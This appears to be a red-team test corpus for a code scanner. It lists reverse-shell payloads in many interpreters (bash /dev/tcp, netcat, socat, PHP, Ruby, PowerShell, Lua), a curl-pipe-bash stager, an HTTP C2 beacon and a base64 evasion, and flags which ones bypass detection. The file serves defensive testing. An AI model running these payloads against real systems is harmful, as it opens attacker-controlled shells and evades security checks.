// red-team/corpus/reverse-shell-extended.js
// Extended reverse-shell / remote-command variants across interpreters and tools.

module.exports = [
  // ── Covered by /dev/tcp or "| bash" literals (expected BLOCK) ────────────────
  {
    id: 'revsh-python-devtcp',
    category: 'reverse-shell', technique: 'python-dev-tcp', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'python -c reverse shell that shells out through /dev/tcp',
    code: `require('child_process').exec("python3 -c 'import os; os.system(\\"bash -i >& /dev/tcp/10.0.0.5/443 0>&1\\")'");`,
  },
  {
    id: 'revsh-perl-devtcp',
    category: 'reverse-shell', technique: 'perl-dev-tcp', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'perl one-liner reverse shell over /dev/tcp',
    code: `require('child_process').exec('perl -e \\'exec "sh -i >& /dev/tcp/attacker/9001 0>&1"\\'');`,
  },
  {
    id: 'revsh-exec-fd-devtcp',
    category: 'reverse-shell', technique: 'exec-fd-dev-tcp', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'exec 5<>/dev/tcp file-descriptor reverse shell',
    code: `require('child_process').execSync('exec 5<>/dev/tcp/10.0.0.9/8080; cat <&5 | while read l; do $l >&5; done');`,
  },
  {
    id: 'revsh-curl-fsSL-bash',
    category: 'reverse-shell', technique: 'curl-pipe-bash', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'curl -fsSL <stager> | bash',
    code: `require('child_process').execSync('curl -fsSL http://evil.example/x | bash');`,
  },
  {
    id: 'revsh-gsocket-bash',
    category: 'reverse-shell', technique: 'curl-pipe-bash', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'global socket (gsocket) deploy piped into bash',
    code: `require('child_process').exec('curl -s gsocket.io/x | bash');`,
  },

  // ── Interpreters / tools NOT covered by the literals (known bypass) ──────────
  {
    id: 'revsh-nc-e',
    category: 'reverse-shell', technique: 'netcat-exec', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: true,
    description: 'netcat -e /bin/sh reverse shell — no /dev/tcp and no "| bash" literal',
    code: `require('child_process').exec('nc -e /bin/sh attacker.example 4444');`,
  },
  {
    id: 'revsh-ncat-exec',
    category: 'reverse-shell', technique: 'ncat-exec', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: true,
    description: 'ncat --exec reverse shell',
    code: `require('child_process').exec('ncat --exec "/bin/bash" attacker.example 4444');`,
  },
  {
    id: 'revsh-socat',
    category: 'reverse-shell', technique: 'socat-exec', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: true,
    description: 'socat reverse shell with a pty',
    code: `require('child_process').exec('socat TCP:attacker.example:4444 EXEC:/bin/bash,pty,stderr');`,
  },
  {
    id: 'revsh-php-fsockopen',
    category: 'reverse-shell', technique: 'php-fsockopen', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: true,
    description: 'php -r fsockopen reverse shell',
    code: `require('child_process').exec("php -r '$s=fsockopen(\\"attacker\\",4444);exec(\\"/bin/sh -i <&3 >&3 2>&3\\");'");`,
  },
  {
    id: 'revsh-ruby-socket',
    category: 'reverse-shell', technique: 'ruby-socket', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: true,
    description: 'ruby TCPSocket reverse shell',
    code: "require('child_process').exec('ruby -rsocket -e \"c=TCPSocket.new(0,4444);loop{c.print(IO.popen(c.gets,&:read))}\"');",
  },
  {
    id: 'revsh-powershell-tcpclient',
    category: 'reverse-shell', technique: 'powershell-tcpclient', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: true,
    description: 'PowerShell TCPClient reverse shell',
    code: `require('child_process').exec('powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(\\'attacker\\',4444)"');`,
  },
  {
    id: 'revsh-node-http-beacon',
    category: 'reverse-shell', technique: 'http-poll-c2', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: true,
    description: 'HTTP-polling C2 beacon: fetch a command, run it, POST the output (network + process-exec, which is not a blocking rule)',
    code: `
      const cp = require('child_process');
      setInterval(() => {
        fetch('https://c2.example/cmd').then((r) => r.text()).then((cmd) => {
          cp.exec(cmd, (e, out) => fetch('https://c2.example/out', { method: 'POST', body: out }));
        });
      }, 5000);
      module.exports = {};
    `,
  },
  {
    id: 'revsh-mkfifo-backpipe',
    category: 'reverse-shell', technique: 'mkfifo-backpipe', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: true,
    description: 'mkfifo backpipe reverse shell with nc',
    code: `require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker 4444 >/tmp/f');`,
  },
  {
    id: 'revsh-bash-i-only',
    category: 'reverse-shell', technique: 'interactive-shell-only', severity: 'HIGH',
    expected: 'BLOCK', knownBypass: true,
    description: 'bash -i without the >& redirect — deliberately not matched (F-29 hardened the signature to require the stdio redirect)',
    code: `require('child_process').spawn('bash', ['-i'], { stdio: 'pipe' });`,
  },
  {
    id: 'revsh-base64-devtcp',
    category: 'reverse-shell', technique: 'base64-cmd-evasion', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: true,
    description: 'The /dev/tcp command is base64-encoded and shelled out via bash -c (no plaintext /dev/tcp literal, and decode+exec is not eval so OBFUSCATED_CODE_EXECUTION does not fire)',
    code: `
      const p = Buffer.from('YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=', 'base64').toString();
      require('child_process').exec('bash -c "' + p + '"');
      module.exports = {};
    `,
  },
  {
    id: 'revsh-lua-socket',
    category: 'reverse-shell', technique: 'lua-socket', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: true,
    description: 'lua socket reverse shell',
    code: `require('child_process').exec('lua -e "require(\\'socket\\'); os.execute(\\'/bin/sh\\')"');`,
  },
];
